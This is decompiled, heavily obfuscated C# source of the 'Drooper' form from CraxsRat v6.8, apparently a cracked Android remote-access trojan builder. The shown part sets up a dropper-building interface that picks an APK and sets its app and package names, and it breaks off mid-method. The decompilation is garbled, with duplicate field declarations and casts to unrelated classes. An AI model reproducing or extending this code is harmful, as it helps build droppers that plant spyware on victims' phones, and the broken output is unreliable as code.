// Decompiled with JetBrains decompiler
// Type: Craxs_Rat.Drooper
// Assembly: CraxsRat, Version=6.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 518449F5-7012-4EDA-9924-A26EC676C6A1
// Assembly location: C:\Users\HP\Downloads\CraxsRat v6.8 by TG @Hackfilter - Copy\CraxsRat VIP\CraxsRat_protected.exe

using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

#nullable disable
namespace Craxs_Rat
{
  [DesignerGenerated]
  public class Drooper : Form
  {
    private string[] sizearry;
    private bool progma;
    private bool first;
    private IContainer components;
    public string Title;
    public string TheText;
    private IContainer components;
    private string ARTEXT;
    private string ENTEXT;
    private bool IsArab;
    private DateTime StartNow;
    private IContainer components;

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.DrakeUISymbolLabel1 = new DrakeUISymbolLabel();
      this.Panel1 = new Panel();
label_1:
      int num1 = 1507023477;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((num1 ^ 620600971 * (89450227 * (1122906241 * 2047135325)) + (-1205314483 * -452150288 - --377874093 + (~1073969357 - (-110370417 - 709040398))) ^ ~-1016483274 ^ -(~-1962664638 - 213705937 * -1094575024 ^ (974745702 ^ 1696811439) + (-1631589200 ^ 218017017))) * -1059587809)) % 140U)
        {
          case 0:
            this.Panel2.Controls.Add((Control) this.labelid);
            this.Panel2.Controls.Add((Control) this.labelname);
            num1 = (int) num2 * -702903554 ^ 1306723757;
            continue;
          case 1:
            this.textpkgname.FillColor = Color.Black;
            this.textpkgname.FillDisableColor = Color.Black;
            num1 = (int) num2 * -1850283453 ^ -1952539797;
            continue;
          case 2:
            this.textpkgname.ForeDisableColor = Color.White;
            this.textpkgname.Location = new Point(251, 53);
            num1 = (int) num2 * -16017016 ^ -226329050;
            continue;
          case 3:
            this.Controls.Add((Control) this.Panel2);
            num1 = (int) num2 * 613011463 ^ 1334509183;
            continue;
          case 4:
            this.TapkText.Location = new Point(10, 34);
            this.TapkText.Margin = new Padding(5, 6, 5, 6);
            this.TapkText.Maximum = (double) int.MaxValue;
            this.TapkText.Minimum = (double) int.MinValue;
            this.TapkText.Name = EXGuarder.\u0030B10246F;
            num1 = (int) num2 * 1392424311 ^ -766757430;
            continue;
          case 5:
            this.TapkText.FillDisableColor = Color.Black;
            num1 = (int) num2 * -303148845 ^ -1335262791;
            continue;
          case 6:
            this.Panel3.Name = EXGuarder.\u00349111372;
            num1 = (int) num2 * 107612672 ^ 428463868;
            continue;
          case 7:
            this.FormBorderStyle = FormBorderStyle.FixedToolWindow;
            num1 = (int) num2 * 959770666 ^ -695775986;
            continue;
          case 8:
            this.Button3.UseVisualStyleBackColor = true;
            num1 = (int) num2 * 1044275048 ^ -350562339;
            continue;
          case 9:
            this.TapkText.Padding = new Padding(7, 6, 7, 6);
            num1 = (int) num2 * 517416839 ^ 584901149;
            continue;
          case 10:
            this.Panel3.Location = new Point(0, 233);
            num1 = (int) num2 * -1698571360 ^ 1868496251;
            continue;
          case 11:
            this.selectapkbtn.FlatAppearance.MouseDownBackColor = Color.FromArgb(10, 10, 10);
            num1 = (int) num2 * 1814965975 ^ -1347774326;
            continue;
          case 12:
            this.textappname.Size = new Size(254, 32);
            num1 = (int) num2 * -803513086 ^ -1183328270;
            continue;
          case 13:
            this.logtext.Font = new Font(EXGuarder.\u00378317000, 9f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * -2040702969 ^ -82113594;
            continue;
          case 14:
            this.logtext.ReadOnly = true;
            this.logtext.Size = new Size(519, 318);
            num1 = (int) num2 * 1439717797 ^ 1810162110;
            continue;
          case 15:
            this.labelid.TabIndex = 50;
            num1 = (int) num2 * -350628907 ^ -690878081;
            continue;
          case 16:
            this.Panel1.Size = new Size(519, 100);
            num1 = (int) num2 * 31202471 ^ 126039122;
            continue;
          case 17:
            this.ShowIcon = false;
            this.Text = EXGuarder.\u0035F516B2B;
            this.Panel1.ResumeLayout(false);
            ((ISupportInitialize) this.apkicon).EndInit();
            num1 = (int) num2 * -513254343 ^ 1998339625;
            continue;
          case 18:
            this.apkicon.TabStop = false;
            num1 = (int) num2 * 763088787 ^ 1037410327;
            continue;
          case 19:
            this.logtext.Dock = DockStyle.Fill;
            num1 = (int) num2 * 1941269829 ^ 2071417721;
            continue;
          case 20:
            this.logtext.ForeColor = Color.Lime;
            this.logtext.Location = new Point(0, 296);
            this.logtext.Name = EXGuarder.\u0032B077229;
            num1 = (int) num2 * -137128606 ^ -951042521;
            continue;
          case 21:
            this.textappname.TextAlignment = ContentAlignment.TopLeft;
            num1 = (int) num2 * -1635924034 ^ -2134151297;
            continue;
          case 22:
            this.Controls.Add((Control) this.logtext);
            this.Controls.Add((Control) this.Button3);
            num1 = (int) num2 * 881986108 ^ -583418901;
            continue;
          case 23:
            this.Panel1.Controls.Add((Control) this.selectapkbtn);
            this.Panel1.Controls.Add((Control) this.TapkText);
            num1 = (int) num2 * 1614279589 ^ 634899710;
            continue;
          case 24:
            this.apkicon = new PictureBox();
            num1 = (int) num2 * 102654180 ^ 323739830;
            continue;
          case 25:
            this.textpkgname.Cursor = Cursors.IBeam;
            num1 = (int) num2 * 40352116 ^ -1865415934;
            continue;
          case 26:
            this.DrakeUISymbolLabel1.SymbolColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.DrakeUISymbolLabel1.TabIndex = 1;
            num1 = (int) num2 * -2098208698 ^ -1654042778;
            continue;
          case 27:
            this.Button1.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.Button1.Location = new Point(0, 0);
            num1 = (int) num2 * 591995091 ^ 1672351639;
            continue;
          case 28:
            this.Button1.FlatAppearance.MouseOverBackColor = Color.FromArgb(10, 10, 10);
            num1 = (int) num2 * -1796870860 ^ -681881533;
            continue;
          case 29:
            this.logtext.BorderStyle = BorderStyle.None;
            num1 = (int) num2 * -1722121536 ^ 940705964;
            continue;
          case 30:
            this.logtext = new RichTextBox();
            this.WorkWorker = new BackgroundWorker();
            num1 = (int) num2 * -1451867959 ^ 243535854;
            continue;
          case 31:
            this.apkicon.Dock = DockStyle.Left;
            this.apkicon.Location = new Point(0, 0);
            this.apkicon.Name = EXGuarder.\u0031A000B0C;
            num1 = (int) num2 * 625420467 ^ -1649515347;
            continue;
          case 32:
            this.labelname.Font = new Font(EXGuarder.\u00378317000, 10f);
            num1 = (int) num2 * -1447781632 ^ 1153426456;
            continue;
          case 33:
            this.BackgroundWorker1 = new BackgroundWorker();
            num1 = (int) num2 * 443225992 ^ 1627801525;
            continue;
          case 34:
            this.TapkText.Style = UIStyle.Custom;
            this.TapkText.StyleCustomMode = true;
            num1 = (int) num2 * 1441197134 ^ -1463650360;
            continue;
          case 35:
            this.Button1.Size = new Size(159, 63);
            this.Button1.TabIndex = 48;
            this.Button1.Text = EXGuarder.\u003162C6C37;
            this.Button1.UseVisualStyleBackColor = true;
            num1 = (int) num2 * -441038868 ^ -1592547454;
            continue;
          case 36:
            this.textappname.Radius = 10;
            num1 = (int) num2 * 248699553 ^ 504571692;
            continue;
          case 37:
            this.selectapkbtn.Font = new Font(EXGuarder.\u00378317000, 12f);
            num1 = (int) num2 * -689732307 ^ -1295028992;
            continue;
          case 38:
            this.textappname.ForeColor = Color.White;
            num1 = (int) num2 * 1914634600 ^ 1489961481;
            continue;
          case 39:
            this.DrakeUISymbolLabel1.Padding = new Padding(28, 0, 0, 0);
            num1 = (int) num2 * -916459685 ^ 747530394;
            continue;
          case 40:
            this.Panel2.Controls.Add((Control) this.apkicon);
            this.Panel2.Dock = DockStyle.Top;
            num1 = (int) num2 * 854872060 ^ -959777461;
            continue;
          case 41:
            this.Panel2 = new Panel();
            this.labelid = new Label();
            this.labelname = new Label();
            num1 = (int) num2 * -914831642 ^ -48533380;
            continue;
          case 42:
            this.textpkgname.ForeColor = Color.White;
            num1 = (int) num2 * -1750007152 ^ -180610157;
            continue;
          case 43:
            this.Panel2.ResumeLayout(false);
            this.Panel2.PerformLayout();
            num1 = (int) num2 * 1547350139 ^ 316952566;
            continue;
          case 44:
            this.Button2.Font = new Font(EXGuarder.\u00378317000, 12f);
            num1 = (int) num2 * 776499103 ^ -1884763788;
            continue;
          case 45:
            this.Panel3.Dock = DockStyle.Top;
            num1 = (int) num2 * 825796149 ^ 973133510;
            continue;
          case 46:
            this.Panel3.ResumeLayout(false);
            num1 = (int) num2 * -1506818676 ^ 1641510346;
            continue;
          case 47:
            this.logtext.TabIndex = 51;
            this.logtext.Text = EXGuarder.\u0031E1E4721;
            this.Button3.Dock = DockStyle.Bottom;
            num1 = (int) num2 * -933558416 ^ 276265580;
            continue;
          case 48:
            this.selectapkbtn.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.selectapkbtn.Location = new Point(384, 34);
            this.selectapkbtn.Name = EXGuarder.\u0035559713C;
            this.selectapkbtn.Size = new Size(121, 32);
            num1 = (int) num2 * 1982746567 ^ 919235133;
            continue;
          case 49:
            this.Button1.Name = EXGuarder.\u003394B3976;
            num1 = (int) num2 * -1669760749 ^ -437013285;
            continue;
          case 50:
            this.Button2.Location = new Point(360, 0);
            this.Button2.Name = EXGuarder.\u00342430749;
            num1 = (int) num2 * -958266261 ^ -2088357897;
            continue;
          case 51:
            this.Panel3.Size = new Size(519, 63);
            this.Panel3.TabIndex = 50;
            num1 = (int) num2 * -1774917948 ^ 287906274;
            continue;
          case 52:
            this.textpkgname.Padding = new Padding(7, 6, 7, 6);
            this.textpkgname.Radius = 10;
            this.textpkgname.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -597932866 ^ -2032170993;
            continue;
          case 53:
            this.ResumeLayout(false);
            num1 = (int) num2 * 51072440 ^ -1260331480;
            continue;
          case 54:
            this.TapkText = new DrakeUITextBox();
            num1 = (int) num2 * -210548930 ^ -532199002;
            continue;
          case 55:
            this.labelid.Text = EXGuarder.\u0035F754935;
            num1 = (int) num2 * 1911813089 ^ -701886747;
            continue;
          case 56:
            this.Panel2.Controls.Add((Control) this.textappname);
            num1 = (int) num2 * 1895532526 ^ 1703028925;
            continue;
          case 57:
            this.logtext.BackColor = Color.Black;
            num1 = (int) num2 * 526173061 ^ -1848556017;
            continue;
          case 58:
            this.Controls.Add((Control) this.Panel3);
            num1 = (int) num2 * -1977098158 ^ 1292173480;
            continue;
          case 59:
            this.Button3.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -459376799 ^ -272376513;
            continue;
          case 60:
            this.Panel1.SuspendLayout();
            num1 = (int) num2 * -1692998953 ^ 1235128759;
            continue;
          case 61:
            this.textpkgname.Margin = new Padding(5, 6, 5, 6);
            num1 = (int) num2 * 1752588829 ^ -1731201741;
            continue;
          case 62:
            this.textappname.Margin = new Padding(5, 6, 5, 6);
            num1 = (int) num2 * -729498022 ^ 775577901;
            continue;
          case 63:
            this.textappname.Location = new Point(251, 9);
            num1 = (int) num2 * 1776990394 ^ 779332241;
            continue;
          case 64:
            this.textappname.Maximum = (double) int.MaxValue;
            this.textappname.Minimum = (double) int.MinValue;
            this.textappname.Name = EXGuarder.\u0030C1A1525;
            num1 = (int) num2 * -689907888 ^ 717990745;
            continue;
          case 65:
            this.DrakeUISymbolLabel1.Name = EXGuarder.\u0033F4E3960;
            num1 = (int) num2 * 126185647 ^ 2024739367;
            continue;
          case 66:
            this.Button3.TabIndex = 52;
            num1 = (int) num2 * 260253607 ^ -981018796;
            continue;
          case 67:
            this.labelname.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.labelname.Location = new Point(132, 9);
            num1 = (int) num2 * -788356466 ^ -479105070;
            continue;
          case 68:
            this.Button1.Font = new Font(EXGuarder.\u00378317000, 12f);
            num1 = (int) num2 * -70758258 ^ 745382296;
            continue;
          case 69:
            this.selectapkbtn.FlatStyle = FlatStyle.Flat;
            num1 = (int) num2 * 759660785 ^ -1063192721;
            continue;
          case 70:
            this.Panel2.Location = new Point(0, 135);
            num1 = (int) num2 * -54223409 ^ 436677065;
            continue;
          case 71:
            goto label_3;
          case 72:
            this.Button3.FlatAppearance.MouseOverBackColor = Color.FromArgb(10, 10, 10);
            this.Button3.FlatStyle = FlatStyle.Flat;
            num1 = (int) num2 * -1810561525 ^ 1234126286;
            continue;
          case 73:
            this.TapkText.Font = new Font(EXGuarder.\u00378317000, 12f);
            num1 = (int) num2 * 109376033 ^ 1968028188;
            continue;
          case 74:
            this.Panel2.Name = EXGuarder.\u0031578516D;
            this.Panel2.Size = new Size(519, 98);
            this.Panel2.TabIndex = 4;
            this.labelid.AutoSize = true;
            num1 = (int) num2 * 170192711 ^ 1922889954;
            continue;
          case 75:
            this.Name = EXGuarder.\u0035F516B2B;
            num1 = (int) num2 * 777886886 ^ 695274556;
            continue;
          case 76:
            this.Button2.UseVisualStyleBackColor = true;
            this.Panel3.Controls.Add((Control) this.Button2);
            this.Panel3.Controls.Add((Control) this.Button1);
            num1 = (int) num2 * 1335575446 ^ 1038144842;
            continue;
          case 77:
            this.DrakeUISymbolLabel1.Text = EXGuarder.\u00371042500;
            num1 = (int) num2 * -2146531403 ^ -1484060587;
            continue;
          case 78:
            this.textpkgname.RectDisableColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 656758059 ^ -527891970;
            continue;
          case 79:
            this.textappname.StyleCustomMode = true;
            this.textappname.TabIndex = 47;
            num1 = (int) num2 * 1953133940 ^ 1050719890;
            continue;
          case 80:
            this.textappname.Watermark = EXGuarder.\u0031B06190F;
            num1 = (int) num2 * 1864650004 ^ 416657412;
            continue;
          case 81:
            this.textappname.FillColor = Color.Black;
            this.textappname.FillDisableColor = Color.Black;
            this.textappname.Font = new Font(EXGuarder.\u00378317000, 12f);
            num1 = (int) num2 * 701445361 ^ -1139370170;
            continue;
          case 82:
            this.Button1.FlatStyle = FlatStyle.Flat;
            num1 = (int) num2 * -141935513 ^ -2069834801;
            continue;
          case 83:
            this.Button2.ForeColor = Color.Lime;
            num1 = (int) num2 * 1513061131 ^ -865997230;
            continue;
          case 84:
            this.TapkText.RectDisableColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.TapkText.Size = new Size(366, 32);
            num1 = (int) num2 * -1805233277 ^ -104649853;
            continue;
          case 85:
            this.Button2.Dock = DockStyle.Right;
            num1 = (int) num2 * 1468640040 ^ -696462269;
            continue;
          case 86:
            this.labelid.Size = new Size(56, 21);
            num1 = (int) num2 * -132135309 ^ 567752742;
            continue;
          case 87:
            this.Button3.Size = new Size(519, 51);
            num1 = (int) num2 * 574950607 ^ 1355581118;
            continue;
          case 88:
            this.textappname.ForeDisableColor = Color.White;
            num1 = (int) num2 * -2121624242 ^ 1906558376;
            continue;
          case 89:
            this.TapkText.Radius = 10;
            this.TapkText.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -342636781 ^ 1003142186;
            continue;
          case 90:
            this.Button1 = new Button();
            num1 = (int) num2 * -2088528605 ^ -1829948983;
            continue;
          case 91:
            this.labelname.Name = EXGuarder.\u0032E2E0F47;
            num1 = (int) num2 * -1016846152 ^ -121706745;
            continue;
          case 92:
            this.Panel1.Dock = DockStyle.Top;
            num1 = (int) num2 * 2144909972 ^ 1971833595;
            continue;
          case 93:
            this.textpkgname.StyleCustomMode = true;
            this.textpkgname.TabIndex = 48;
            this.textpkgname.TextAlignment = ContentAlignment.TopLeft;
            num1 = (int) num2 * 1979811290 ^ -176790381;
            continue;
          case 94:
            this.Button2.FlatAppearance.MouseDownBackColor = Color.FromArgb(10, 10, 10);
            this.Button2.FlatAppearance.MouseOverBackColor = Color.FromArgb(10, 10, 10);
            this.Button2.FlatStyle = FlatStyle.Flat;
            num1 = (int) num2 * 1155741231 ^ 1000034587;
            continue;
          case 95:
            this.Button3.FlatAppearance.MouseDownBackColor = Color.FromArgb(10, 10, 10);
            num1 = (int) num2 * -342882446 ^ -2114349357;
            continue;
          case 96:
            this.selectapkbtn = new Button();
            num1 = (int) num2 * 1295667585 ^ 1504063695;
            continue;
          case 97:
            this.textpkgname = new DrakeUITextBox();
            num1 = (int) num2 * 1098040352 ^ -1223412246;
            continue;
          case 98:
            this.Button2.Text = EXGuarder.\u0036E653E6C;
            num1 = (int) num2 * -516370611 ^ -1808135849;
            continue;
          case 99:
            this.Button3.Location = new Point(0, 614);
            this.Button3.Name = EXGuarder.\u0035F44582A;
            num1 = (int) num2 * -1650423966 ^ 870797430;
            continue;
          case 100:
            this.AutoScaleDimensions = new SizeF(8f, 16f);
            num1 = (int) num2 * 770614334 ^ -491966755;
            continue;
          case 101:
            this.Button3.Text = EXGuarder.\u00374081313;
            num1 = (int) num2 * -930850590 ^ -833575921;
            continue;
          case 102:
            this.labelname.TabIndex = 49;
            this.labelname.Text = EXGuarder.\u0031B06190F;
            num1 = (int) num2 * -1152747428 ^ 801405562;
            continue;
          case 103:
            this.Panel3.SuspendLayout();
            this.SuspendLayout();
            num1 = (int) num2 * -1799577478 ^ 1381822368;
            continue;
          case 104:
            this.AutoScaleMode = AutoScaleMode.Font;
            num1 = (int) num2 * 1251033384 ^ -2014501113;
            continue;
          case 105:
            this.DrakeUISymbolLabel1.Dock = DockStyle.Top;
            num1 = (int) num2 * 1074351358 ^ -682464041;
            continue;
          case 106:
            this.BackColor = Color.Black;
            num1 = (int) num2 * 1524333678 ^ 680859907;
            continue;
          case 107:
            this.TapkText.TabIndex = 46;
            num1 = (int) num2 * -1337660304 ^ 1845664955;
            continue;
          case 108:
            this.selectapkbtn.TabIndex = 47;
            this.selectapkbtn.Text = EXGuarder.\u003443C3F6B;
            this.selectapkbtn.UseVisualStyleBackColor = true;
            this.TapkText.Cursor = Cursors.IBeam;
            this.TapkText.Enabled = false;
            this.TapkText.FillColor = Color.Black;
            num1 = (int) num2 * 1319424312 ^ -1698683730;
            continue;
          case 109:
            this.textpkgname.Maximum = (double) int.MaxValue;
            this.textpkgname.Minimum = (double) int.MinValue;
            this.textpkgname.Name = EXGuarder.\u0030E451038;
            num1 = (int) num2 * 433914346 ^ 1382485791;
            continue;
          case 110:
            this.labelname.Size = new Size(83, 21);
            num1 = (int) num2 * 1033507083 ^ 1247173029;
            continue;
          case 111:
            this.textappname.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.textappname.RectDisableColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 1082819171 ^ 1031464660;
            continue;
          case 112:
            this.textappname.Padding = new Padding(7, 6, 7, 6);
            num1 = (int) num2 * -993271362 ^ 1719499053;
            continue;
          case 113:
            this.labelname.AutoSize = true;
            num1 = (int) num2 * -1752242229 ^ -1165804566;
            continue;
          case 114:
            this.Button2 = new Button();
            this.Panel3 = new Panel();
            num1 = (int) num2 * 1685326235 ^ 1813773969;
            continue;
          case 115:
            this.labelid.Font = new Font(EXGuarder.\u00378317000, 10f);
            num1 = (int) num2 * -982433120 ^ -860261280;
            continue;
          case 116:
            this.DrakeUISymbolLabel1.Font = new Font(EXGuarder.\u00378317000, 14f);
            this.DrakeUISymbolLabel1.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.DrakeUISymbolLabel1.Location = new Point(0, 0);
            num1 = (int) num2 * -1016691548 ^ 804836282;
            continue;
          case 117:
            this.textappname = new DrakeUITextBox();
            num1 = (int) num2 * -1696644957 ^ 1876386264;
            continue;
          case 118:
            ((ISupportInitialize) this.apkicon).BeginInit();
            this.Panel2.SuspendLayout();
            num1 = (int) num2 * -1469928562 ^ -713622432;
            continue;
          case 119:
            this.textpkgname.Font = new Font(EXGuarder.\u00378317000, 12f);
            num1 = (int) num2 * 220104388 ^ -1955859501;
            continue;
          case 120:
            this.textpkgname.Watermark = EXGuarder.\u00370016371;
            this.textappname.Cursor = Cursors.IBeam;
            num1 = (int) num2 * 266862060 ^ -548796294;
            continue;
          case 121:
            this.textappname.Style = UIStyle.Custom;
            num1 = (int) num2 * 828026339 ^ -913993057;
            continue;
          case 122:
            this.Panel1.Location = new Point(0, 35);
            this.Panel1.Name = EXGuarder.\u003004A1B77;
            num1 = (int) num2 * -616633906 ^ -318404827;
            continue;
          case 123:
            this.Button1.Dock = DockStyle.Left;
            this.Button1.FlatAppearance.MouseDownBackColor = Color.FromArgb(10, 10, 10);
            num1 = (int) num2 * -476716552 ^ -936421379;
            continue;
          case 124:
            this.Button2.Size = new Size(159, 63);
            this.Button2.TabIndex = 49;
            num1 = (int) num2 * 1625159554 ^ -1909442765;
            continue;
          case 125:
            this.Panel1.TabIndex = 2;
            num1 = (int) num2 * 2094605100 ^ 1157785440;
            continue;
          case 126:
            this.TapkText.TextAlignment = ContentAlignment.TopLeft;
            this.TapkText.Watermark = EXGuarder.\u003630E6241;
            num1 = (int) num2 * 1974121500 ^ -2111591672;
            continue;
          case (uint) sbyte.MaxValue:
            this.Button3 = new Button();
            num1 = (int) num2 * 666337493 ^ -410682918;
            continue;
          case 128:
            this.TapkText.ForeColor = Color.White;
            this.TapkText.ForeDisableColor = Color.White;
            num1 = (int) num2 * 1465881531 ^ 1131066389;
            continue;
          case 129:
            this.Button3.Font = new Font(EXGuarder.\u00378317000, 12f);
            num1 = (int) num2 * 846149500 ^ 1162274108;
            continue;
          case 130:
            this.ClientSize = new Size(519, 665);
            num1 = (int) num2 * 193943016 ^ -2059781017;
            continue;
          case 131:
            this.apkicon.Size = new Size(126, 98);
            this.apkicon.SizeMode = PictureBoxSizeMode.Zoom;
            this.apkicon.TabIndex = 3;
            num1 = (int) num2 * -1195457291 ^ -1172537292;
            continue;
          case 132:
            this.Panel2.Controls.Add((Control) this.textpkgname);
            num1 = (int) num2 * -96303497 ^ 546065769;
            continue;
          case 133:
            this.Controls.Add((Control) this.Panel1);
            this.Controls.Add((Control) this.DrakeUISymbolLabel1);
            num1 = (int) num2 * 1783240029 ^ 690794249;
            continue;
          case 134:
            this.DrakeUISymbolLabel1.Size = new Size(519, 35);
            num1 = (int) num2 * 1913339134 ^ 1686148250;
            continue;
          case 135:
            this.labelid.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.labelid.Location = new Point(132, 53);
            this.labelid.Name = EXGuarder.\u00321064079;
            num1 = (int) num2 * -141693580 ^ 433459067;
            continue;
          case 136:
            goto label_1;
          case 137:
            this.DrakeUISymbolLabel1.Style = UIStyle.Custom;
            this.DrakeUISymbolLabel1.Symbol = 61465;
            num1 = (int) num2 * -234039363 ^ 2105930154;
            continue;
          case 138:
            this.selectapkbtn.FlatAppearance.MouseOverBackColor = Color.FromArgb(10, 10, 10);
            num1 = (int) num2 * 800379702 ^ -428990498;
            continue;
          case 139:
            this.textpkgname.Size = new Size(254, 32);
            this.textpkgname.Style = UIStyle.Custom;
            num1 = (int) num2 * -1848626157 ^ 1966646539;
            continue;
          default:
            goto label_142;
        }
      }
label_3:
      return;
label_142:;
    }

    internal virtual DrakeUISymbolLabel DrakeUISymbolLabel1
    {
      get => ((EditConnections) this)._DrakeUISymbolLabel1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((EditConnections) this)._DrakeUISymbolLabel1 = value;
      }
    }

    internal virtual Panel Panel1
    {
      get => ((EditConnections) this)._Panel1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((EditConnections) this)._Panel1 = value;
    }

    internal virtual DrakeUITextBox TapkText
    {
      get => ((EditConnections) this)._TapkText;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((EditConnections) this)._TapkText = value;
      }
    }

    internal virtual BackgroundWorker BackgroundWorker1
    {
      get => ((EditConnections) this)._BackgroundWorker1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        DoWorkEventHandler workEventHandler = new DoWorkEventHandler(this.BackgroundWorker1_DoWork);
label_1:
        int num1 = -1559414422;
        while (true)
        {
          int num2 = num1;
          uint num3;
          BackgroundWorker backgroundWorker1;
          switch ((num3 = (uint) (-1134363866 + --712481285 - -(num2 * 1109796065 - -(-78542427 * -1739034583 + 1329995247 * 348149501 - 96082241)))) % 8U)
          {
            case 0:
              backgroundWorker1.DoWork -= workEventHandler;
              num1 = (int) num3 * 1318410171 ^ 263974044;
              continue;
            case 1:
              int num4 = backgroundWorker1 == null ? -996741346 : (num4 = -977710156);
              num1 = num4 ^ (int) num3 * -471802638;
              continue;
            case 2:
              goto label_3;
            case 3:
              goto label_1;
            case 4:
              backgroundWorker1 = ((EditConnections) this)._BackgroundWorker1;
              num1 = (int) num3 * -1103976662 ^ 1850138695;
              continue;
            case 5:
              backgroundWorker1.DoWork += workEventHandler;
              num1 = (int) num3 * 1765960684 ^ 254066524;
              continue;
            case 6:
              ((EditConnections) this)._BackgroundWorker1 = value;
              backgroundWorker1 = ((EditConnections) this)._BackgroundWorker1;
              num1 = -986121811;
              continue;
            case 7:
              int num5 = backgroundWorker1 == null ? 686164935 : (num5 = 885973980);
              num1 = num5 ^ (int) num3 * -1308886511;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual PictureBox apkicon
    {
      get => ((EditConnections) this)._apkicon;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((EditConnections) this)._apkicon = value;
    }

    internal virtual Panel Panel2
    {
      get => ((EditConnections) this)._Panel2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((EditConnections) this)._Panel2 = value;
    }

    internal virtual Button selectapkbtn
    {
      get => ((EditConnections) this)._selectapkbtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Selectapkbtn_Click);
        Button selectapkbtn = ((EditConnections) this)._selectapkbtn;
label_1:
        int num1 = -329907522;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~(num1 + ~(~(-82866235 - 634847330 - 1564714152) * 1069240297) ^ -~---2045098282)) % 6U)
          {
            case 0:
              ((EditConnections) this)._selectapkbtn = value;
              selectapkbtn = ((EditConnections) this)._selectapkbtn;
              int num3;
              num1 = num3 = selectapkbtn == null ? -287294591 : (num3 = -248202692);
              continue;
            case 1:
              int num4 = selectapkbtn == null ? 195059871 : (num4 = 672494751);
              num1 = num4 ^ (int) num2 * 102220072;
              continue;
            case 2:
              goto label_3;
            case 3:
              selectapkbtn.Click += eventHandler;
              num1 = (int) num2 * 493311362 ^ 2000823551;
              continue;
            case 4:
              selectapkbtn.Click -= eventHandler;
              num1 = (int) num2 * -1590150718 ^ 1662995523;
              continue;
            case 5:
              goto label_1;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
    }

    internal virtual Label labelid
    {
      get => ((EditConnections) this)._labelid;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((EditConnections) this)._labelid = value;
    }

    internal virtual Label labelname
    {
      get => ((EditConnections) this)._labelname;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((EditConnections) this)._labelname = value;
      }
    }

    internal virtual DrakeUITextBox textpkgname
    {
      get => ((EditConnections) this)._textpkgname;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((EditConnections) this)._textpkgname = value;
      }
    }

    internal virtual DrakeUITextBox textappname
    {
      get => ((EditConnections) this)._textappname;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((EditConnections) this)._textappname = value;
      }
    }

    internal virtual Button Button1
    {
      get => ((EditConnections) this)._Button1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Button1_Click);
label_1:
        int num1 = 565250347;
        Button button1;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((-((num1 - (~-(-441878529 * 432418919 ^ -2015476367 - 527360134) ^ 1418548477 + 1061825841 * ((1372480101 ^ -880627574) + -1695116999 * 1153161028))) * 672264513) + -(-876771777 * 1027178397) - -57767530 * -329267899) * -1329295309)) % 8U)
          {
            case 0:
              button1.Click += eventHandler;
              num1 = (int) num2 * -1544992837 ^ -1473349742;
              continue;
            case 1:
              button1.Click -= eventHandler;
              num1 = (int) num2 * -2014856159 ^ -382626474;
              continue;
            case 2:
              goto label_3;
            case 3:
              ((EditConnections) this)._Button1 = value;
              num1 = 809556297;
              continue;
            case 4:
              int num3 = button1 == null ? -1629927958 : (num3 = -2122696296);
              num1 = num3 ^ (int) num2 * 63388310;
              continue;
            case 5:
              button1 = ((EditConnections) this)._Button1;
              num1 = (int) num2 * -1291513898 ^ 1478680034;
              continue;
            case 6:
              goto label_1;
            case 7:
              button1 = ((EditConnections) this)._Button1;
              int num4 = button1 == null ? -81474096 : (num4 = 260632322);
              num1 = num4 ^ (int) num2 * 1097988753;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual Button Button2
    {
      get => ((Editor) this)._Button2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Button2_Click);
        Button button2 = ((Editor) this)._Button2;
        if (button2 == null)
          goto label_5;
label_1:
        int num1 = 1434823722;
label_2:
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) -(-num1 * -931986583 ^ 889158302 ^ -~-2101359065 ^ --2038416662)) % 5U)
          {
            case 0:
              goto label_3;
            case 1:
              button2.Click -= eventHandler;
              num1 = (int) num2 * 218037772 ^ 1987664959;
              continue;
            case 2:
              button2.Click += eventHandler;
              num1 = (int) num2 * -743528440 ^ 156351930;
              continue;
            case 3:
              goto label_5;
            case 4:
